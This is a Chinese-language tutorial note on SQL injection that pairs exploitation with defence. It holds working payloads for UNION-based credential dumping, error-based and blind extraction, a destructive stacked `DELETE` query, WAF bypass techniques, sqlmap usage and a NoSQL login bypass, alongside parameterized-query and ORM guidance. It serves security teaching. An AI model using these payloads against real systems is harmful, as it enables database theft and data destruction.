# SQL 注入详解

- 日期：2026-11-04
- 所属大纲阶段：第 3 阶段 Web 安全
- 参考资料：PortSwigger Web Security Academy（SQL injection 全模块）、OWASP SQL Injection Prevention Cheat Sheet、SQLi Payload 字典（PayloadsAllTheThings）、《SQL 注入攻击与防御》（Justin Clarke, 第 2 版）
- 前置阅读：[02-Web后端常见漏洞与攻击](02-Web后端常见漏洞与攻击.md)
- 说明：所有 payload 仅限本地靶场（sqli-labs、DVWA、PortSwigger Academy）使用。

---

## 1. 原理深入：参数化为什么安全

### 1.1 SQL 语句的编译模型

数据库执行 SQL 分两个阶段：
1. **解析/编译**：词法分析 → 语法树 → 执行计划（此时确定语句结构：是什么命令、操作哪些表）；
2. **执行**：把具体值代入执行计划运行。

拼接字符串的问题：**用户输入参与了解析阶段**，攻击者输入的 `'` 改变了语法树的形状（闭合字符串字面量），使后续内容被解析为 SQL 结构（`OR`、`UNION`、`--`）。

参数化查询（prepared statement）强制分离两个阶段：

```sql
-- 语句结构先被编译（占位符 ? 是语法的一部分）
PREPARE stmt FROM 'SELECT * FROM users WHERE name = ?';
-- 数据在执行阶段代入，永远只可能是「值」，不可能改变语法树
EXECUTE stmt USING @name;
```

这就是为什么参数化查询不是「更好的转义」而是**本质安全**：值永远没有机会被解析为代码。

### 1.2 注入成立的三要素

① 输入可达 SQL；② 输入能改变语句结构（未参数化/未充分编码）；③ 错误或行为差异可被观测（回显、布尔、时间——盲注依然可利用，只是慢）。

---

## 2. 利用技术详解

### 2.1 探测与确认

```sql
'            -- 语法错误（500 / SQL 报错）→ 强信号
' OR '1'='1  -- 返回变多/登录成功 → 恒真注入
' OR '1'='2  -- 返回变少 → 对比实验
1' ORDER BY 1-- / 2-- / 3--  -- ORDER BY 探测列数（报错临界点）
```

### 2.2 UNION 注入标准流程（以 MySQL + sqli-labs Less-1 为例）

```sql
-- ① 探列数
?id=0' ORDER BY 4--          -- 第 4 列报错 → 共 3 列
-- ② 找回显位
?id=0' UNION SELECT 1,2,3--  -- 页面显示 2、3 → 可用回显位
-- ③ 采集信息
?id=0' UNION SELECT 1,version(),database()--        -- 5.7.29 / security
-- ④ 枚举表名（information_schema）
?id=0' UNION SELECT 1,group_concat(table_name),3
      FROM information_schema.tables WHERE table_schema=database()--
-- ⑤ 枚举列名
?id=0' UNION SELECT 1,group_concat(column_name),3
      FROM information_schema.columns WHERE table_name='users'--
-- ⑥ 拖数据
?id=0' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

`0x3a` 是 `:` 的十六进制——避免引号被过滤的常用技巧。

### 2.3 报错注入（回显错误信息时）

```sql
-- MySQL 5.1+（extractvalue/updatexml，32 位长度限制）
' AND extractvalue(1, concat(0x7e, (SELECT database())))--
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--
-- MySQL 重复键报错
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x
      FROM information_schema.tables GROUP BY x)a)--
```

### 2.4 布尔盲注（有真假两种响应、无数据回显）

```sql
-- 逐位二分猜解：database() 第 1 个字符的 ASCII 是否 >= 115
' AND ASCII(SUBSTRING((SELECT database()),1,1)) >= 115--
```
流程：写脚本循环二分（7 次试探定 1 字符）。工具：Burp Intruder（Cluster bomb + 标记 Grep Match）、sqlmap `--technique=B`。

### 2.5 时间盲注（真假响应完全一致）

```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>=115, SLEEP(5), 0)--
-- PostgreSQL
'; SELECT CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END--
-- MSSQL
'; IF (cond) WAITFOR DELAY '0:0:5'--
```
注意干扰因素：网络抖动（多次取基线）、`SLEEP` 占用连接（`max_connections` 可能打满——靶场无妨，生产渗透需克制）。

### 2.6 各数据库差异速查

| 能力 | MySQL | MSSQL | Oracle | PostgreSQL |
|---|---|---|---|---|
| 版本 | `version()` | `@@version` | `SELECT banner FROM v$version` | `version()` |
| 库名 | `database()` | `DB_NAME()` | `SELECT SYS_CONTEXT('USERENV','DB_NAME')` | `current_database()` |
| 元数据 | information_schema | information_schema / sys.* | ALL_TABLES / USER_TABLES | information_schema |
| 字符串拼接 | `CONCAT()` | `+` | `\|\|` | `\|\|` |
| 堆叠查询 | 默认否（PHP mysqli_multi 可） | 是（mssql 默认允许） | 否（需 PL/SQL 注入点） | 是（psql 驱动允许） |
| 文件读写 | `LOAD_FILE` / `INTO OUTFILE`（需 FILE 权限+secure_file_priv） | `OPENROWSET` / `xp_cmdshell` | UTL_FILE | `COPY` / `pg_read_file`（超级用户） |

### 2.7 堆叠与二阶注入

- **堆叠（Stacked）**：`; DELETE FROM logs--`。支持时直接从「读」升级到「写/删/建」（sqli-labs Less-38+）。
- **二阶注入（Second-order）**：输入先被安全存入（转义后入库），**取出后**在另一条语句里被不安全使用（如注册名 `admin'--` 存库成功，修改密码时拼入 UPDATE）。对「一切入库数据出库后再用」的场景保持警惕——参数化必须覆盖**每一次** SQL，不是入口处一次。

### 2.8 WAF/过滤绕过（靶场攻防常用）

| 过滤 | 绕过 |
|---|---|
| 空格 | `/**/`、括号包裹 `(SELECT 1)`、Tab `%09` |
| 引号 | 十六进制 `0x61646d696e`、`CHAR()` |
| 关键字 | 大小写 `SeLeCt`、内联注释 `/*!50000SELECT*/`（MySQL 版本注释）、双写 `SESELECTLECT`（单次过滤删除） |
| `=` | `LIKE`、`REGEXP`、`BETWEEN`、`<>` 取反 |
| `AND/OR` | `&&` / `\|\|`、异或 `XOR` |

### 2.9 sqlmap（仅授权靶场）

```bash
python sqlmap.py -u "http://target/item?id=1" --batch --dbs
# POST 请求：-r request.txt（Burp 导出的原始请求）
# 高级：--technique=BT --level=3 --risk=2、--tamper=space2comment.py（绕过）、--os-shell（特定条件）
```

---

## 3. 真实案例

- **Heartland Payment（2008）**：SQL 注入入侵支付处理系统，约 1.3 亿张卡信息泄露，史上最大支付数据泄露之一（企业因此破产重组）。
- **Bitbar（2013）**：无视上报的 SQLi，最终被入侵拖库（「We are aware of the report, but it is not an issue」→ 一周后被拖库），经典傲慢案例。
- 各类通用 CMS（WordPress 插件生态、Discuz 历史）中大量 SQLi CVE——供应链视角：**你引入的插件即你的攻击面**。

---

## 4. 防御详解

### 4.1 参数化查询——各语言正确写法

```python
# Python + psycopg2 / sqlite3 / mysql-connector
cur.execute("SELECT * FROM users WHERE id = %s AND name = %s", (uid, name))
```
```java
// Java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, uid);
```
```go
// Go database/sql
db.Query("SELECT * FROM users WHERE id = $1", uid)
```

**必须注意的失效场景**：参数化只能绑定「值」，不能绑定标识符与语句片段：

```sql
-- 表名/列名/排序方向无法用占位符 → 需白名单
ORDER BY {column} {asc|desc}     -- column 白名单映射，方向枚举判断
LIMIT {n}                        -- n 强制 int 校验
```

### 4.2 ORM 的安全边界

| 安全（默认参数化） | 危险（退回拼接） |
|---|---|
| Django `User.objects.filter(name=n)` | `.extra(where=[f"name='{n}'"])` |
| SQLAlchemy `session.query(User).filter_by(name=n)` | `text(f"SELECT ... WHERE name='{n}'")`（`text()` 用 `:param` 绑定则安全） |
| MyBatis `#{}` | MyBatis `${}`（经常被误用于 ORDER BY） |

`${}` vs `#{}` 是 Java 面试与审计的高频考点：`#{}` 预编译绑定，`${}` 字符串替换。

### 4.3 存储过程

预编译的存储过程可安全（参数以值传入），但**存储过程内部若拼接动态 SQL 依然注入**；且它带来权限集中问题。不是银弹。

### 4.4 纵深防御

1. **最小权限账号**：应用连接用专用账号，禁 `FILE`/DDL/跨库；读写分离两个账号。
2. **错误处理**：统一异常页，不向客户端回显 SQL 错误（既防报错注入也防信息收集）；错误详情进日志。
3. **WAF / 网关规则**：拦常见 payload（可被绕过，作为一层而非全部）。
4. **输入校验**：数字 ID 强制 `int()`，枚举字段白名单——缩小注入面。
5. **监控**：数据库审计日志 + 异常查询告警（`SLEEP`、`information_schema` 大量访问、错误率突增）。
6. **代码审查**：全库搜索拼接痕迹：`f"SELECT`、`" + sql`、`${`（MyBatis）、`.raw(`、`.extra(`、`execute(".*\+`。

---

## 5. 常见误区

- ❌「转义输入就够了」→ 转义依赖上下文（数字/字符串/标识符各有规则），手工转义是漏洞之源，一律参数化。
- ❌「NoSQL 没有注入」→ MongoDB 操作符注入：`{"pass": {"$ne": ""}}` 绕过登录；Elasticsearch/GraphQL 查询注入同理。
- ❌「用了 ORM 就没有注入」→ 见 4.2 的退回拼接出口。
- ❌「数据库在内网，注入也无所谓」→ 注入 → `LOAD_FILE`/堆叠 → 写 WebShell / 横向（内网不是边界，见 SSRF 笔记）。
- ❌「报错页关了就防住报错注入」→ 盲注不需要报错页。

---

## 复习自查

- [ ] 能解释「参数化为什么本质安全」——用「解析阶段与执行阶段分离」的语言
- [ ] 能手工完成 UNION 注入五步（探列数→找回显→采集→枚举→拖库）
- [ ] 能写出布尔盲注的二分脚本伪代码
- [ ] 能说出 MyBatis `#{}`/`${}` 的区别与各 3 个正确/错误用例
- [ ] 能列出 ORM 中至少 4 个退回拼接的高危 API
- [ ] 理解二阶注入并知道防御覆盖范围是「每一次 SQL」

## 延伸实验（labs 计划）

1. sqli-labs（Docker：`acgpiano/sqli-labs`）Less 1–16 通关，覆盖 UNION/报错/盲注。
2. PortSwigger SQL injection 模块（含 UNION 攻击 10+ labs、WAF 绕过、二阶注入 lab）。
3. 自建 demo：Flask 路由分别实现拼接版与参数化版，sqlmap 打拼版本 → 修复后复测。
